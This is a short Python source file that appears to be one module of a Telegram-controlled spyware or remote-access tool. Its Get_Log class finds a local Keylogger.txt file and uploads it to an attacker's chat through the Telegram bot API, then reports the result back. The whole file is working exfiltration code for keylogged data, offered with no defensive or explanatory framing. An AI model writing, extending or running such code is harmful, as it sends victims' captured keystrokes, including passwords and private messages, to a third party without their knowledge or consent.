import os, sys
import requests
class Get_Log():
	def __init__(self, _):
		self.token = _.token
		self.chat_id = _.chat_id
		self.Send_Message = _.Send_Message
		self.Main()

	def Main(self):
		filename = os.path.dirname(os.path.abspath(sys.argv[0])) + "\\Keylogger.txt"
		if os.path.exists(filename):
			file = open(filename, "r")
			requests.get('https://api.telegram.org/bot' + self.token + '/sendDocument?chat_id=' + self.chat_id, files = {'document' : file})
			file.close()
			self.Send_Message.Send("%E2%9C%94%EF%B8%8F Log File Send Succsed.")
		else:
			self.Send_Message.Send("%E2%9C%96%EF%B8%8F Log File Not Exists")
